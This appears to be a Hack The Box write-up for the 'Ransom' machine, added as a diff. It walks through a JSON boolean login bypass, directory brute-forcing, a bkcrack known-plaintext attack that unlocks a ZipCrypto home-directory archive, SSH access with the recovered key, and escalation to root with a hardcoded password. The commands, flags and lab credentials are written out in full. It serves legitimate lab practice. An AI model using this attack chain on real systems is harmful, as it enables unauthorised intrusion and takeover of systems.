@@ -1,0 +1,96 @@
+Machine-Name : Ransom
+IP Address   : 10.129.227.93
+
+Command-Line: sudo nmap 10.129.227.93 -p- -A -T4 -o nmap/init.txt
+Result:
+    ./nmap/init.txt
+
+Notes: Viewed the application through the browser on port 80. A single password was asked for. After sending the request to BurpSuite, it became apparent that the form was being sent using a 'GET' request. Content-Type was set to 'application/json', and the password was sent as a JSON object with a boolean value of 'true'.
+
+Example:
+
+Content-Type: application/json
+{"password": true}
+
+Result:
+    Login Successful
+
+Command-Line(~/HackingTools/DirSearch): ./dirsearch.py -w /usr/share/wordlists/SecLists/Discovery/Web-Content/raft-medium-words.txt -e php,txt -f -t 50 -i 200-205,302,403 -u http://10.129.227.93
+Result:
+    Found page /user.txt
+    2769ac8df07ef910293c588e3af3f94a
+    USER OWNED
+
+Notes: Downloading homedirectory.zip. Put contents in ./home-dir-encrypted
+File: uploaded-file-3422.zip
+
+Command-Line: 7z l -slt uploaded-file-3422.zip > home-dir-encrypted-files.txt
+Result:
+    ./home-dir-encrypted/home-dir-encrypted-files.txt
+
+Notes: Encrypted using 'ZipCrypto Deflate'.
+
+README: https://medium.com/@whickey000/how-i-cracked-conti-ransomware-groups-leaked-source-code-zip-file-e15d54663a8
+
+Notes: .bash_logout has a common size with /etc/skel/.bash_logout (220)
+
+Command-Line: cp /etc/skel/.bash_logout ./bash_logout
+Result:
+    ./bash_logout
+
+Command-Line: zip bash_logout.zip bash_logout
+Result:
+    ./bash_logout.zip
+
+Description:
+    ./bkcrack -C <encrypted-zip> -c <The-file-in-the-encrypted-zip-to-attack> -P <The-plain-text-zip-file-of-same-size> -p <The-file-in-the-encrypted-zip-to-attack>
+
+Command-Line: ./bkcrack -C /home/kali/HTB/Machines/Ranson_NF/home-dir-encrypted/uploaded-file-3422.zip -c .bash_logout -P /home/kali/HTB/Machines/Ranson_NF/bash_logout.zip -p bash_logout
+Result:
+    bkcrack 1.4.0 - 2022-05-19
+    [15:55:57] Z reduction using 150 bytes of known plaintext
+    100.0 % (150 / 150)
+    [15:55:57] Attack on 54614 Z values at index 7
+    Keys: 7b549874 ebc25ec5 7e465e18
+    4.2 % (2309 / 54614)
+    [15:56:00] Keys
+    7b549874 ebc25ec5 7e465e18
+
+Notes: The '7b549874 ebc25ec5 7e465e18' key can be used to reset the encrypted zip's password.
+
+Command-Line: ./bkcrack -C /home/kali/HTB/Machines/Ranson_NF/home-dir-encrypted/uploaded-file-3422.zip -k 7b549874 ebc25ec5 7e465e18 -U /home/kali/HTB/Machines/Ranson_NF/home-dir-encrypted/unencrypted.zip
+Result:
+    unencrypted.zip Password123
+    bkcrack 1.4.0 - 2022-05-19
+    [16:01:45] Writing unlocked archive /home/kali/HTB/Machines/Ranson_NF/home-dir-encrypted/unencrypted.zip with password "Password123"
+    100.0 % (9 / 9)
+    Wrote unlocked archive.
+
+Command-Line: unzip unencrypted.zip
+Password: Password123
+Result:
+    FILE ACCESS
+
+Command-Line: ls -la
+Command-Line: cd .ssh
+Command-Line: chmod 600 id_rsa
+Command-Line: ssh -i id_rsa htb@10.129.227.93
+Result:
+    LOGIN SUCCESSFUL
+
+htb@ransom: cd /srv/prod/app/Http/Controllers
+htb@ransom: cat AuthController.php
+Result:
+    ./AuthController.php
+
+Notes: Found password: UHC-March-Global-PW!
+
+htb@ransom: su root
+Password: UHC-March-Global-PW!
+Result:
+    LOGIN SUCCESSFUL
+
+root@ransom: cat /root/root.txt
+Result:
+    6507a71890d38ebdc7a580b2eb2a33f8
+    ROOT OWNED
